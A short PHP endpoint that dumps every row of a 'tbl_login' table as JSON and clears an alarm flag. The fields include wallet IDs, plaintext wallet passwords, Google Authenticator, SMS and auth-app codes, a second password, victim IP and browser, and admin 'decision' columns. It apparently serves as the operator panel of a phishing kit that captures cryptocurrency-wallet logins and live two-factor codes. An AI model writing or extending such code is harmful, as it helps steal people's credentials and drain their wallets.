<?php
    include "./config/data.php";
    
    // $googleAuthEmail = $_POST['googleAuthEmail'];
    // $sql = "SELECT * tbl_login WHERE 1";
    $sql = "SELECT * FROM tbl_login";
    $result = $conn->query($sql);

    $sql = "UPDATE tbl_login SET is_alarm = 'no'";
    $result_1 = $conn->query($sql);

    $array = array();
    if ($result->num_rows > 0) {
        // output data of each row
            while($row = $result->fetch_assoc()) {
                array_push($array, [
                    'id' => $row['id'],
                    'wallet_id' => $row['wallet_id'],
                    'wallet_pwd' => $row['wallet_pwd'],
                    'google_auth_code' => $row['google_auth_code'],
                    'sms_code' => $row['sms_code'],
                    'auth_app_code' => $row['auth_app_code'],
                    'password2' => $row['password2'],
                    'ip' => $row['ip'],
                    'browser_name' => $row['browser_name'],
                    'time' => $row['time'],
                    'updatetime' => $row['updatetime'],
                    'admin_decision' => $row['admin_decision'],
                    'final_decision' => $row['final_decision'],
                    'user_status' => $row['user_status'],
                    'is_alarm' => $row['is_alarm'],
                ]);
            }
            
            echo json_encode($array);
    } else {
        echo json_encode($array);
    }

?>